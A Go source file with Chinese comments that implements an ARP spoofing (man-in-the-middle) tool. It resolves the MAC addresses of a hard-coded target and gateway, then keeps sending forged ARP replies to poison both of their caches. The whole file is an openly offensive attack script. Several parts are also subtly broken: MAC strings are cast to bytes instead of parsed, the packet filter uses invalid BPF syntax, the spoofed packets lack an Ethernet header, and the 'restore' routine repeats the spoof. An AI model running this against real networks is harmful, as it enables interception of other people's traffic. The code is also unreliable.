package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {
	// 配置目标 IP 和网关 IP
	targetIP := "192.168.1.100"
	gatewayIP := "192.168.1.1"
	interfaceName := "eth0" // 替换为你的网络接口名称

	// 获取目标和网关的 MAC 地址
	targetMAC, _ := getMACAddress(interfaceName, targetIP)
	gatewayMAC, _ := getMACAddress(interfaceName, gatewayIP)

	if targetMAC == "" || gatewayMAC == "" {
		log.Fatal("无法获取目标或网关的 MAC 地址")
	}

	// 打开网络接口
	handle, err := pcap.OpenLive(interfaceName, 1600, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// 捕获信号以恢复 ARP 表
	cleanupChannel := make(chan os.Signal, 1)
	signal.Notify(cleanupChannel, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-cleanupChannel
		fmt.Println("恢复 ARP 表...")
		restoreARP(targetIP, targetMAC, gatewayIP, gatewayMAC, handle)
		handle.Close()
		os.Exit(0)
	}()

	fmt.Println("开始 ARP 欺骗...")

	for {
		// 欺骗目标设备，使其认为攻击者是网关
		spoofARP(targetIP, targetMAC, gatewayIP, gatewayMAC, handle)
		// 欺骗网关，使其认为攻击者是目标设备
		spoofARP(gatewayIP, gatewayMAC, targetIP, targetMAC, handle)

		time.Sleep(2 * time.Second)
	}
}

func spoofARP(targetIP, targetMAC, spoofIP, spoofMAC string, handle *pcap.Handle) {
	// 创建 ARP 数据包
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6, // Ethernet 地址长度为 6 字节
		ProtAddressSize:   4, // IPv4 地址长度为 4 字节
		Operation:         layers.ARPReply,
		SourceHwAddress:   net.HardwareAddr(spoofMAC),
		SourceProtAddress: net.ParseIP(spoofIP).To4(),
		DstHwAddress:      net.HardwareAddr(targetMAC),
		DstProtAddress:    net.ParseIP(targetIP).To4(),
	}

	// 序列化 ARP 数据包
	packet := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	gopacket.SerializeLayers(packet, opts, &arp)

	// 发送伪造的 ARP 数据包
	err := handle.WritePacketData(packet.Bytes())
	if err != nil {
		log.Println("发送 ARP 数据包失败:", err)
	} else {
		log.Println("伪造的 ARP 数据包已发送")
	}
}

func restoreARP(targetIP, targetMAC, gatewayIP, gatewayMAC string, handle *pcap.Handle) {
	// 恢复正常的 ARP 表
	spoofARP(targetIP, targetMAC, gatewayIP, gatewayMAC, handle)
	spoofARP(gatewayIP, gatewayMAC, targetIP, targetMAC, handle)
}

// getMACAddress 通过发送 ARP 请求获取目标设备的 MAC 地址
func getMACAddress(device, targetIP string) (string, error) {
	// 解析目标 IP 地址
	targetIPAddr := net.ParseIP(targetIP)
	if targetIPAddr == nil {
		return "", fmt.Errorf("无效的 IP 地址: %s", targetIP)
	}

	// 打开网络接口
	handle, err := pcap.OpenLive(device, 1600, false, pcap.BlockForever)
	if err != nil {
		return "", fmt.Errorf("无法打开网络接口 %s: %v", device, err)
	}
	defer handle.Close()

	// 设置过滤器，只捕获目标 IP 的 ARP 响应
	filter := fmt.Sprintf("arp && arp.spa == %s", targetIP)
	if err := handle.SetBPFFilter(filter); err != nil {
		return "", fmt.Errorf("无法设置过滤器: %v", err)
	}

	// 构造 ARP 请求
	eth := layers.Ethernet{
		SrcMAC:       net.HardwareAddr("00:11:22:33:44:55"), // 替换为你的源 MAC 地址
		DstMAC:       net.HardwareAddr("ff:ff:ff:ff:ff:ff"), // 广播地址
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   net.HardwareAddr("00:11:22:33:44:55"), // 替换为你的源 MAC 地址
		SourceProtAddress: net.ParseIP("192.168.1.100").To4(),    // 替换为你的源 IP 地址
		DstHwAddress:      net.HardwareAddr("00:00:00:00:00:00"), // 目标 MAC 地址未知
		DstProtAddress:    targetIPAddr.To4(),
	}

	// 序列化数据包
	packet := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	gopacket.SerializeLayers(packet, opts, &eth, &arp)

	// 发送 ARP 请求
	if err := handle.WritePacketData(packet.Bytes()); err != nil {
		return "", fmt.Errorf("无法发送 ARP 请求: %v", err)
	}

	// 设置超时时间
	timeOut := time.After(5 * time.Second)
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	// 捕获 ARP 响应
	for {
		select {
		case packet := <-packetSource.Packets():
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer != nil {
				arpInfo, _ := arpLayer.(*layers.ARP)
				srcIP := net.IP(arpInfo.SourceProtAddress)
				if arpInfo.Operation == layers.ARPReply && srcIP.Equal(net.ParseIP(targetIP)) {
					return net.HardwareAddr(arpInfo.SourceHwAddress).String(), nil
				}
			}
		case <-timeOut:
			return "", fmt.Errorf("超时，未收到 ARP 响应")
		}
	}
}
